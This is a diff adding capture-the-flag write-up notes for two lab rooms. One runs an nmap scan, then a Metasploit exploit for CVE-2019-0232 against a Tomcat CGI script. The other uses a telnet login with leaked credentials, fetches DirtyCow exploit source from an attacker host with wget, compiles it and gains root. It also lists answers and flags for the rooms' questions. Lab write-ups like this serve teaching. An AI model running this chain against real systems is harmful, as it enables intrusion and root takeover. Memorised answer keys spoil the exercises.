@@ -365,11 +365,139 @@ cat /root/flag.txt
 ## Ready, set, elf
 
 ```shell
+nmap -T4 -p- -A 10.10.176.13
+#shows that host seems down, so we use -Pn
+
+nmap -T4 -Pn -A 10.10.176.13
+#gives details about web services
+#gives Apache Tomcat web server version
+#searching for the version vulnerability or cve shows us results
+
+#according to given data
+#we can view cgi scripts in /cgi-bin
+#further, the script name is also given as elfwhacker.bat
+#so /cgi-bin/elfwhacker.bat shows us details
+
+msfconsole
+#metasploit
+
+search 2019-0232
+#gives us a module
+
+use 0
+#use that module
+
+show options
+
+set LHOST 10.17.48.136
+
+set RHOSTS 10.10.176.13
+
+set TARGETURI /cgi-bin/elfwhacker.bat
+
+show options
+
+run
+#gives us access to machine
+
+shell
+#for using system commands
+
+dir
+
+type flag1.txt
+#from here, we can attempt privilege escalation
+```
+
+```markdown
+1. What is the version number of the web server? - 9.0.17
+
+2. What CVE can be used to create a Meterpreter entry onto the machine? - CVE-2019-0232
+
+3. What are the contents of flag1.txt? - thm{whacking_all_the_elves}
 ```
 
 ## Coal for Christmas
 
 ```shell
+nmap -T4 -p- -A 10.10.86.167
+#lists ports, services
+#we can use telnet to login
+
+telnet 10.10.86.167 23
+#gives creds santa:clauschristmas
+#we can login further
+
+#after logging in
+pwd
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+#upgrade to /bin/bash
+
+ls
+#shows files
+
+cat /etc/*release
+#shows distribution version
+
+cat cookies_and_milk.txt
+#shows some C source code
+#portion of DirtyCow kernel exploit
+#we can use the complete exploit code for privilege escalation
+
+#in attacker machine
+vim dirty.c
+
+python3 -m http.server 8080
+
+#in target machine
+wget http://10.17.48.136:8080/dirty.c
+
+ls
+
+gcc -pthread dirty.c -o dirty -lcrypt
+#compiles dirty.c
+
+ls
+
+./dirty
+#runs the exploit
+#we can give any password to new user
+#now we can switch to this user
+
+su firefart
+#enter new password
+
+id
+#root access
+
+cd /root
+
+ls
+
+cat message_from_the_grinch.txt
+#run commands according to note, to get flag
+
+touch coal
+
+tree | md5sum
+#gives flag
+```
+
+```markdown
+1. What protocol and service is running? - telnet
+
+2. What credential was left? - clauschristmas
+
+3. What distribution of Linux and version number is this server running? - Ubuntu 12.04
+
+4. Who got here first? - Grinch
+
+5. What is the verbatim syntax you can use to compile? - gcc -pthread dirty.c -o dirty -lcrypt
+
+6. What new username was created, with the default operations of the source code? - firefart
+
+7. What is the MD5 hash output? - 8b16f00dd3b51efadb02c1df7f8427cc
 ```
 
 ## Where's Rudolph
